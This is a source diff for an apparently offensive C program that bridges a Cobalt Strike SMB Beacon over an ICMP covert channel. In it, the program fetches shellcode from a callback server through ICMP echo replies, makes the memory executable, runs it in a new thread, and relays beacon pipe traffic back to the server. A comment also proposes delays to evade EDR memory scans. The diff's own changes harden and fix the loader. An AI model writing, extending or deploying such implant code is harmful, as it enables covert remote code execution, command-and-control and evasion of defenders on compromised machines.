@@ -68,14 +68,14 @@ ex:
 #define TAG_SIZE       4  //tag size
 #define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
 //Cobalt Strike Settings
-#define PAYLOAD_MAX_SIZE 512 * 1024
-#define BUFFER_MAX_SIZE 1024 * 1024
+#define PAYLOAD_MAX_SIZE (512 * 1024)
+#define BUFFER_MAX_SIZE (1024 * 1024)
 ///////////////////////////////////////////////////////////////////////
 //Ohkay actual code stuff now:
 
 // Prototypes
 int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
-char* recv_icmp_fragments(SOCKET s);
+char* recv_icmp_fragments(SOCKET s, uint32_t *out_len);
 char* recv_icmp(SOCKET s);
 DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max);
 void write_frame(HANDLE my_handle, char * buffer, DWORD length);
@@ -175,7 +175,7 @@ int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int paylo
 //   - payload starts with “RQ47”
 // Reassembles chunks of data (each chunk carries up to ICMP_PAYLOAD_SIZE−TAG_SIZE bytes).
 //
-char* recv_icmp_fragments(SOCKET s) {
+char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
     char recvbuf[MAX_PACKET_SIZE];
     struct sockaddr_in from;
     int fromlen = sizeof(from);
@@ -235,6 +235,14 @@ char* recv_icmp_fragments(SOCKET s) {
                 free(reassembly_buffer);
                 reassembly_buffer = NULL;
             }
+            //check for max payload size - this makes sure that the clietn doesn't send some massive
+            //buffer and crash the client. Currently set to half a mb.
+            if (expected_size == 0 || expected_size > PAYLOAD_MAX_SIZE) {
+                printf("[-] Invalid payload size %u (exceeds %u)\n",
+                    expected_size, PAYLOAD_MAX_SIZE);
+                return NULL;
+            }
+            //allocate memory for the buffer
             reassembly_buffer = (char*)malloc(expected_size);
             if (!reassembly_buffer) {
                 perror("malloc");
@@ -302,7 +310,8 @@ char* recv_icmp_fragments(SOCKET s) {
                 //    printf("%02x ", (unsigned char)reassembly_buffer[i]);
                 //}
                 //printf("\n");
-
+                //need to have expected length for buffer reasons
+                *out_len = expected_size;
                 return reassembly_buffer;
             }
         }
@@ -366,45 +375,45 @@ char* recv_icmp(SOCKET s) {
 Gets payload, returns char * to shellcode
 
 */
-char* get_payload(SOCKET s) {
-    //socket setup
-    struct sockaddr_in dest;
-    dest.sin_family = AF_INET;
-    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
+// char* get_payload(SOCKET s) {
+//     //socket setup
+//     struct sockaddr_in dest;
+//     dest.sin_family = AF_INET;
+//     dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
 
-    //get payload
-    // 1) Build “seq=0” size packet
-    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
-    uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
-    uint32_t netlen = htonl(expected_server_payload);
+//     //get payload
+//     // 1) Build “seq=0” size packet
+//     //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
+//     uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
+//     uint32_t netlen = htonl(expected_server_payload);
 
-    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
-    //// Copy “RQ47”
-    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
-    //// Then 4-byte big-endian length
-    memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
-    //Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
-    int size_payload_len = TAG_SIZE + sizeof(netlen);
+//     char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+//     //// Copy “RQ47”
+//     memcpy(size_buf, ICMP_TAG, TAG_SIZE);
+//     //// Then 4-byte big-endian length
+//     memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
+//     //Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
+//     int size_payload_len = TAG_SIZE + sizeof(netlen);
 
-    //// Send seq=0 Echo Request
-    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
-        printf("[-] Failed to send seq=0 packet\n");
-        closesocket(s);
-        return NULL;
-    }
+//     //// Send seq=0 Echo Request
+//     if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
+//         printf("[-] Failed to send seq=0 packet\n");
+//         closesocket(s);
+//         return NULL;
+//     }
 
-    //// 2) Wait for and reassemble all fragments (Echo Replies)
-    char* shellcode = recv_icmp_fragments(s);
-    if (!shellcode) {
-        printf("[-] Failed to receive full payload\n");
-        closesocket(s);
-        return NULL;
-    }
+//     //// 2) Wait for and reassemble all fragments (Echo Replies)
+//     char* shellcode = recv_icmp_fragments(s);
+//     if (!shellcode) {
+//         printf("[-] Failed to receive full payload\n");
+//         closesocket(s);
+//         return NULL;
+//     }
 
     
-    printf("[+] Received full payload: first 256 bytes as string:\n    %.256s\n", shellcode);
-    return shellcode;
-}
+//     printf("[+] Received full payload: first 256 bytes as string:\n    %.256s\n", shellcode);
+//     return shellcode;
+// }
 
 //
 // bridge_to_beacon: high-level flow
@@ -430,13 +439,46 @@ int bridge_to_beacon() {
     dest.sin_family = AF_INET;
     dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
 
-    //Grab payload over ICMP Bridge
-    char * shellcode = get_payload(s);
-    if (!shellcode) {
-        fprintf(stderr, "[-] get_payload failed, exiting.\n");
-        exit(EXIT_FAILURE);
+    //get payload
+    // 1) Build “seq=0” size packet
+    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
+    uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
+    uint32_t netlen = htonl(expected_server_payload);
+
+    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+    //// Copy “RQ47”
+    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
+    //// Then 4-byte big-endian length
+    memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
+    //Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
+    int size_payload_len = TAG_SIZE + sizeof(netlen);
+
+    //// Send seq=0 Echo Request
+    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
+        printf("[-] Failed to send seq=0 packet\n");
+        closesocket(s);
+        return 0;
     }
-    unsigned int shellcode_len = (unsigned int)sizeof(shellcode);
+
+    //// 2) Wait for and reassemble all fragments (Echo Replies)
+    uint32_t shellcode_len;
+    char* shellcode = recv_icmp_fragments(s, &shellcode_len);
+    if (!shellcode) {
+        printf("[-] Failed to receive full payload\n");
+        closesocket(s);
+        return 0;
+    }
+
+    
+    printf("[+] Received full payload: %u bytes\n", shellcode_len);
+    printf("    First 256 bytes as string: %.256s\n", shellcode);
+    //Grab payload over ICMP Bridge
+    //char * shellcode = get_payload(s);
+    // if (!shellcode) {
+    //     fprintf(stderr, "[-] get_payload failed, exiting.\n");
+    //     exit(EXIT_FAILURE);
+    // }
+    //unsigned int shellcode_len = (unsigned int)sizeof(shellcode);
 
     //could do some sneaky stuff here, make it sleep for X seconds before allocating memory to
     //potentially avoid an EDR mem scan
@@ -445,10 +487,10 @@ int bridge_to_beacon() {
     //// 1) Allocate R/W memory, copy your x64 shellcode, make it executable
     ///////////////////////////////////////////////////////////////////////
 
-    printf("[+] Allocating memory");
+    printf("[+] Allocating memory\n");
     LPVOID exec_mem = VirtualAlloc(
         NULL,
-        shellcode_len,
+        PAYLOAD_MAX_SIZE, //allocate a buffer the size of the payload max size 
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE
     );
@@ -461,9 +503,9 @@ int bridge_to_beacon() {
     RtlMoveMemory(exec_mem, shellcode, shellcode_len);
 
     // Change to R/X so CreateThread can jump into it
-    printf("[+] Changing to R/X");
+    printf("[+] Changing to R/X\n");
     DWORD old_prot;
-    if (!VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &old_prot)) {
+    if (!VirtualProtect(exec_mem, PAYLOAD_MAX_SIZE, PAGE_EXECUTE_READ, &old_prot)) {
         printf("[-] VirtualProtect failed: %u\n", GetLastError());
         return 1;
     }
@@ -471,7 +513,7 @@ int bridge_to_beacon() {
     ///////////////////////////////////////////////////////////////////////
     //// 2) Create a thread off of that exec_mem so the SMB Beacon actually runs
     ///////////////////////////////////////////////////////////////////////
-    printf("[+] Creating Thread");
+    printf("[+] Creating Thread\n");
 
     HANDLE hShellcode = CreateThread(
         NULL,                        // default security
@@ -495,6 +537,7 @@ int bridge_to_beacon() {
     while (handle_beacon == INVALID_HANDLE_VALUE) {
         Sleep(1000); // sleep is here to make sure the pipe gets spun up, instead of infinitely looping over it .
         //remember, beacon is the one that opens the pipe, so if it doesn't run, we get no pipe :(
+        printf("[+] Trying to connect to pipe...\n");
         handle_beacon = CreateFileA(
             PIPENAME,
             GENERIC_READ | GENERIC_WRITE,
@@ -509,7 +552,7 @@ int bridge_to_beacon() {
             printf("[*] CreateFileA still invalid (err=%u), retrying...\n", err);
         }
     }
-    printf("[+] Connected to pipe: handle_beacon = %p\n", handle_beacon);
+    //printf("[+] Connected to pipe = %p\n", handle_beacon);
 
     printf("[+] Allocating Pipe buffer\n");
     char* pipe_buffer = (char*)malloc(BUFFER_MAX_SIZE);
@@ -529,10 +572,10 @@ int bridge_to_beacon() {
         // Read from beacon’s pipe
         DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
         //may need to disable this for testing:
-        if (beacon_output == 0 || beacon_output == (DWORD)-1) {
-            printf("[+] No data, exiting\n");
-            break;
-        }
+        // if (beacon_output == 0 || beacon_output == (DWORD)-1) {
+        //     printf("[+] No data, exiting\n");
+        //     break;
+        // }
 
         // Construct chunk payload: TAG + data
         int data_len = (int)beacon_output;
